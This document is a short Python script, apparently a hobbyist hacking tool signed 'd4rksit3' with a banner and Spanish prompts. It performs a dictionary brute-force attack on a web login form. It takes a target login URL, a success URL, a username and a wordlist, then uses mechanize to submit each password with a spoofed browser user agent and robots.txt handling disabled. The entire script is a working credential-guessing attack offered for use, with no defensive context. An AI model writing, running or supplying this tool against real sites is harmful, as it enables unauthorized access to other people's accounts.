#d4rksit3
import mechanize 
import sys,os
import colorama
from colorama import Fore,init
init()
os.system("cls")
print(Fore.GREEN+"""

	·▄▄▄▄   ▄▄▄· ▄▄▄  ▄ •▄ .▄▄ · ▪  ▄▄▄▄▄▄▄▄ .
	██▪ ██ ▐█ ▀█ ▀▄ █·█▌▄▌▪▐█ ▀. ██ •██  ▀▄.▀·
	▐█· ▐█▌▄█▀▀█ ▐▀▀▄ ▐▀▀▄·▄▀▀▀█▄▐█· ▐█.▪▐▀▀▪▄
	██. ██ ▐█ ▪▐▌▐█•█▌▐█.█▌▐█▄▪▐█▐█▌ ▐█▌·▐█▄▄▌
	▀▀▀▀▀•  ▀  ▀ .▀  ▀·▀  ▀ ▀▀▀▀ ▀▀▀ ▀▀▀  ▀▀▀ 
	""")

url = input("Ingrese Url del login: "+Fore.RESET)
urls = input(Fore.GREEN+"Ingrese Url de salida: "+Fore.RESET)
user= input(Fore.GREEN+"Ingrese el username: "+Fore.RESET)
diccionario = input(Fore.GREEN+"ingrese diccionario: "+Fore.RESET)


def ataque(password):
	print("\nUsername: "+user+"\nPassword: "+ str(password))
	try:
		br = mechanize.Browser()
		br.set_handle_robots(False)
		br.addheaders = [('User-agent', "firefox")]
		br.open(url)
		br.select_form(nr=0)
		br.form['username'] = user
		br.form['password'] = password
		sub = br.submit()
		log = sub.geturl()
		if log == urls:
			print(Fore.GREEN+"\npassword found!"+Fore.RESET)
			sys.exit(1)
		else:
			print(Fore.RED+"pass not found"+Fore.RESET)
	except Exception as error:
		pass

with open(diccionario, "r") as claves:
	for clave in claves:
#password = open(diccionario, "r")
#for passwords in password :		
		ataque(clave)